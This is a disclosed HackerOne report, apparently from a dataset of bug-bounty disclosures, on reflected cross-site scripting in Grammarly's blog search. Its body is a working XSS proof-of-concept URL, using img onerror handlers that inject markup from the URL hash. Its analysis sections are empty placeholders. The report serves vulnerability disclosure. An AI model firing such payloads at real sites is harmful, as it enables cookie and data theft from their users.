---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '435144'
original_report_id: '435144'
title: Reflected Cross Site Scripting (XSS)
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: grammarly
created_at: '2018-11-06T19:43:37.557Z'
disclosed_at: '2019-04-30T06:10:04.276Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 10
asset_identifier: blog.grammarly.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected Cross Site Scripting (XSS)

## Metadata

- HackerOne Report ID: 435144
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: grammarly
- Disclosed At: 2019-04-30T06:10:04.276Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

hi there,
here is the link that fired XSS

https://www.grammarly.com/blog/search/"><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>

## Impact

stealing cookies
stealing data etc.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
